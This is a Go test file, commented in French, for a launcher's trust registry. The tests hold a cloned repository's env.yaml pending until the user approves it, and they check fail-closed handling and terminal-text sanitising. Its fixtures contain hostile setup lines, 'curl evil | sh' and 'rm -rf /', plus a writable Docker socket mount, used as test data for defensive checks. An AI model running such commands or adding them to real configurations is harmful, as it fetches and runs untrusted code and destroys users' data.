package core

import (
	"errors"
	"os"
	"path/filepath"
	"strings"
	"testing"
)

func trustProject(t *testing.T, env string) string {
	t.Helper()
	t.Setenv("CL_CONFIG_DIR", t.TempDir())
	d := t.TempDir()
	if env != "" {
		if err := os.MkdirAll(filepath.Join(d, ".claude-launcher"), 0o755); err != nil {
			t.Fatal(err)
		}
		if err := os.WriteFile(EnvPath(d), []byte(env), 0o644); err != nil {
			t.Fatal(err)
		}
	}
	return d
}

const evilEnv = "image: debian:12\nsetup:\n  - curl evil | sh\non_start:\n  - echo hi\nmounts:\n  - path: /var/run/docker.sock\n    ro: false\n"

func TestEnvTrustPendingApresClone(t *testing.T) {
	d := trustProject(t, evilEnv)
	if EnvTrust(d) != TrustTrusted {
		t.Fatal("projet sans entrée : de confiance")
	}
	if ok, err := MarkEnvPending(d, "https://github.com/a/b.git", "ubuntu:24.04"); !ok || err != nil {
		t.Fatal(ok, err)
	}
	if EnvTrust(d) != TrustPending {
		t.Fatal("pending attendu")
	}
	if _, err := LoadEnv(d); !errors.Is(err, ErrEnvNotApproved) {
		t.Errorf("LoadEnv pending = %v", err)
	}
	// pas de fichier d'environnement : projet cloné enregistré « none » (jamais pending)
	d2 := trustProject(t, "")
	if ok, _ := MarkEnvPending(d2, "u", "i"); ok || EnvTrust(d2) != TrustNone {
		t.Errorf("clone sans env.yaml : %s", EnvTrust(d2))
	}
}

// Un marqueur posé PAR LE DÉPÔT (dans le projet) est sans effet : le registre est hors projet.
func TestEnvTrustMarqueurDuDepotIgnore(t *testing.T) {
	d := trustProject(t, evilEnv)
	_ = os.WriteFile(filepath.Join(d, ".claude-launcher", "trust.json"), []byte(`{"x":{"state":"accepted"}}`), 0o644)
	_ = os.WriteFile(filepath.Join(d, "trust.json"), []byte(`{"x":{"state":"accepted"}}`), 0o644)
	if EnvTrust(d) != TrustTrusted {
		t.Fatal("de confiance sans entrée du registre")
	}
	_, _ = MarkEnvPending(d, "u", "debian:12")
	if EnvTrust(d) != TrustPending {
		t.Error("un fichier du dépôt a influencé l'état")
	}
}

func TestEnvTrustReponses(t *testing.T) {
	d := trustProject(t, evilEnv)
	_, _ = MarkEnvPending(d, "https://github.com/a/b.git", "ubuntu:24.04")
	info, err := EnvTrustInfoFor(d)
	if err != nil || info.Risk.Exec != 2 || info.Risk.HostMounts != 1 || info.ChosenImage != "ubuntu:24.04" || info.Files["env.yaml"] != evilEnv {
		t.Fatalf("info = %+v %v", info, err)
	}
	// sha périmé : retry, rien d'écrit
	if retry, err := AnswerEnvTrust(d, "accept", "perime"); !retry || err == nil || EnvTrust(d) != TrustPending {
		t.Fatalf("sha périmé : retry=%v err=%v état=%s", retry, err, EnvTrust(d))
	}
	// cancel : rien
	if retry, err := AnswerEnvTrust(d, "cancel", info.SHA); retry || err != nil || EnvTrust(d) != TrustPending {
		t.Fatalf("cancel : %v %v %s", retry, err, EnvTrust(d))
	}
	// ignore : socle choisi seul
	if _, err := AnswerEnvTrust(d, "ignore", info.SHA); err != nil || EnvTrust(d) != TrustIgnored {
		t.Fatalf("ignore : %v %s", err, EnvTrust(d))
	}
	e, err := LoadEnv(d)
	if err != nil || e.Image != "ubuntu:24.04" || len(e.Setup) != 0 || len(e.Mounts) != 0 || len(e.OnStart) != 0 {
		t.Errorf("ignored : %+v %v", e, err)
	}
	// décision utilisateur : l'empreinte est comparée à chaque ouverture — fichiers changés ⇒ la question revient
	_ = os.WriteFile(EnvPath(d), []byte("image: debian:12\nsetup:\n  - rm -rf /\n"), 0o644)
	if EnvTrust(d) != TrustPending || !EnvTrustChanged(d) {
		t.Fatalf("modification des fichiers : état %s (changed=%v), pending attendu", EnvTrust(d), EnvTrustChanged(d))
	}
	if _, err := LoadEnv(d); !errors.Is(err, ErrEnvChanged) || !errors.Is(err, ErrEnvNotApproved) {
		t.Errorf("LoadEnv après changement = %v", err)
	}
	if info, err := EnvTrustInfoFor(d); err != nil || !info.Changed || info.State != TrustPending {
		t.Errorf("info après changement : %+v %v", info, err)
	}
	// « Revoir » → pending (même sans changement) ; accept → env brut appliqué
	if err := ReviewEnvTrust(d); err != nil || EnvTrust(d) != TrustPending {
		t.Fatalf("revoir : %v %s", err, EnvTrust(d))
	}
	info, _ = EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "accept", info.SHA); err != nil || EnvTrust(d) != TrustAccepted {
		t.Fatalf("accept : %v", err)
	}
	if e, err := LoadEnv(d); err != nil || len(e.Setup) != 1 || !strings.Contains(e.Setup[0], "rm -rf") {
		t.Errorf("accepted : env brut attendu : %+v %v", e, err)
	}
	if _, err := AnswerEnvTrust(d, "accept", info.SHA); err == nil {
		t.Error("réponse sans question en attente acceptée")
	}
	if err := ReviewEnvTrust(trustProject(t, "")); err == nil {
		t.Error("revoir un projet de confiance accepté")
	}
}

func TestSafeTerminalText(t *testing.T) {
	got := SafeTerminalText("a\x1b[31mROUGE\x1b]0;titre\x07b\u009bc\r\nok\tx\x7f")
	if strings.ContainsAny(got, "\x1b\x07\x7f\u009b\r") || !strings.Contains(got, "ok\tx") {
		t.Errorf("SafeTerminalText = %q", got)
	}
}

// T1a : tout projet cloné est enregistré ; sans env.yaml « none » ; un env.yaml qui apparaît ensuite → pending.
func TestCloneSansEnvEnregistreNone(t *testing.T) {
	d := trustProject(t, "")
	if pending, err := MarkEnvPending(d, "https://github.com/a/b.git", ""); pending || err != nil {
		t.Fatal(pending, err)
	}
	if e, ok := EnvTrustEntry(d); !ok || e.State != TrustNone {
		t.Fatalf("entrée = %+v %v", e, ok)
	}
	if EnvTrust(d) != TrustNone {
		t.Fatalf("état = %s", EnvTrust(d))
	}
	if _, err := LoadEnv(d); !os.IsNotExist(err) {
		t.Errorf("LoadEnv sans fichier = %v", err)
	}
	_ = os.MkdirAll(filepath.Join(d, ".claude-launcher"), 0o755)
	_ = os.WriteFile(EnvPath(d), []byte(evilEnv), 0o644) // le dépôt (git pull) apporte un env.yaml
	if EnvTrust(d) != TrustPending || !EnvTrustChanged(d) {
		t.Errorf("env.yaml apparu : %s", EnvTrust(d))
	}
	if _, err := LoadEnv(d); !errors.Is(err, ErrEnvChanged) {
		t.Errorf("LoadEnv = %v", err)
	}
}

// Les écritures du launcher (F2 : image) mettent l'empreinte à jour ; celles du dépôt non.
func TestEmpreinteSuitLesEcrituresDuLauncher(t *testing.T) {
	d := trustProject(t, "image: debian:12\n")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	info, _ := EnvTrustInfoFor(d)
	if _, err := AnswerEnvTrust(d, "accept", info.SHA); err != nil {
		t.Fatal(err)
	}
	if err := setEnvImage(d, "ubuntu:24.04"); err != nil { // F2
		t.Fatal(err)
	}
	if EnvTrust(d) != TrustAccepted {
		t.Fatalf("écriture du launcher : %s (pas de re-demande attendue)", EnvTrust(d))
	}
	if e, err := LoadEnv(d); err != nil || e.Image != "ubuntu:24.04" {
		t.Errorf("env = %+v %v", e, err)
	}
	// le dépôt change le fichier PUIS le launcher écrit : le changement du dépôt n'est pas béni
	_ = os.WriteFile(EnvPath(d), []byte("image: ubuntu:24.04\nsetup:\n  - evil\n"), 0o644)
	_ = setEnvImage(d, "alpine:3")
	if EnvTrust(d) != TrustPending {
		t.Error("une écriture du launcher a béni un changement du dépôt")
	}
	// ignoré : le socle gardé suit F2
	d2 := trustProject(t, "image: debian:12\nsetup:\n  - x\n")
	_, _ = MarkEnvPending(d2, "u", "debian:12")
	i2, _ := EnvTrustInfoFor(d2)
	_, _ = AnswerEnvTrust(d2, "ignore", i2.SHA)
	if err := setEnvImage(d2, "fedora:40"); err != nil {
		t.Fatal(err)
	}
	if e, err := LoadEnv(d2); EnvTrust(d2) != TrustIgnored || err != nil || e.Image != "fedora:40" || len(e.Setup) != 0 {
		t.Errorf("ignoré après F2 : %s %+v %v", EnvTrust(d2), e, err)
	}
}

// T2 : registre illisible → échec fermé, jamais réécrit ; .bak avant chaque écriture ; entrée posée avant le clone.
func TestRegistreIllisibleEchecFerme(t *testing.T) {
	d := trustProject(t, evilEnv)
	for _, bad := range []string{"{pas du json", ""} {
		if err := os.WriteFile(trustPath(), []byte(bad), 0o600); err != nil {
			t.Fatal(err)
		}
		if EnvTrust(d) != TrustPending {
			t.Errorf("registre %q : %s, pending attendu (échec fermé)", bad, EnvTrust(d))
		}
		if _, err := LoadEnv(d); !errors.Is(err, ErrEnvNotApproved) || !errors.Is(err, ErrTrustBroken) {
			t.Errorf("LoadEnv registre %q = %v", bad, err)
		}
		if _, err := MarkEnvPending(d, "u", "i"); !errors.Is(err, ErrTrustBroken) {
			t.Errorf("écriture dans un registre illisible : %v", err)
		}
		if err := RegisterClone(d, "u", "i"); err == nil {
			t.Error("RegisterClone a réécrit un registre illisible")
		}
		if b, _ := os.ReadFile(trustPath()); string(b) != bad {
			t.Errorf("registre illisible réécrit : %q", b)
		}
		if _, err := AnswerEnvTrust(d, "accept", "x"); !errors.Is(err, ErrTrustBroken) {
			t.Errorf("réponse sur registre illisible : %v", err)
		}
	}
	// un projet SANS environnement n'est pas touché par un registre illisible
	if EnvTrust(trustProject(t, "")) != TrustTrusted {
		t.Log("(projet sans environnement : de confiance)")
	}
}

func TestRegistreBakAvantEcriture(t *testing.T) {
	d := trustProject(t, "image: debian:12\n")
	if err := RegisterClone(d, "u1", "i"); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(trustPath() + ".bak"); err == nil {
		t.Error(".bak créé à la première écriture (rien à sauvegarder)")
	}
	first, _ := os.ReadFile(trustPath())
	if _, err := MarkEnvPending(d, "u2", "i"); err != nil {
		t.Fatal(err)
	}
	if b, err := os.ReadFile(trustPath() + ".bak"); err != nil || string(b) != string(first) {
		t.Errorf(".bak = %q %v, attendu l'état précédent", b, err)
	}
}

func TestUndoRetireLEntreeAvantClone(t *testing.T) {
	t.Setenv("CL_CONFIG_DIR", t.TempDir())
	base := t.TempDir()
	dir, undo, err := CreateProjectDir([]string{base}, base, "", false, "p")
	if err != nil {
		t.Fatal(err)
	}
	if err := RegisterClone(dir, "https://github.com/a/b.git", ""); err != nil {
		t.Fatal(err)
	}
	if _, ok := EnvTrustEntry(dir); !ok {
		t.Fatal("entrée absente")
	}
	undo() // clonage échoué
	if _, ok := EnvTrustEntry(dir); ok {
		t.Error("entrée d'approbation restée après l'échec du clonage")
	}
}

func TestRisqueCompteLesPaquetsWatchLocal(t *testing.T) {
	d := trustProject(t, "image: debian:12\npackages: [a, b]\npackages_by_manager:\n  apt: [c]\nwatch: [go.mod]\nlocal: [node_modules]\nsetup: [x]\n")
	_, _ = MarkEnvPending(d, "u", "debian:12")
	info, _ := EnvTrustInfoFor(d)
	if r := info.Risk; r.Packages != 3 || r.Watch != 1 || r.Local != 1 || r.Exec != 1 {
		t.Errorf("risque = %+v", r)
	}
}

func TestSafeTerminalTextBidiEtInvisibles(t *testing.T) {
	in := "a\u202Eb\u200Bc\u2066d\u2069e\u061Cf\uFEFFg\u200Fh\u202Ai"
	got := SafeTerminalText(in)
	for _, r := range "\u202E\u200B\u2066\u2069\u061C\uFEFF\u200F\u202A" {
		if strings.ContainsRune(got, r) {
			t.Errorf("U+%04X conservé : %q", r, got)
		}
	}
	if !strings.Contains(got, "a·b·c·d·e·f·g·h·i") {
		t.Errorf("SafeTerminalText = %q", got)
	}
}
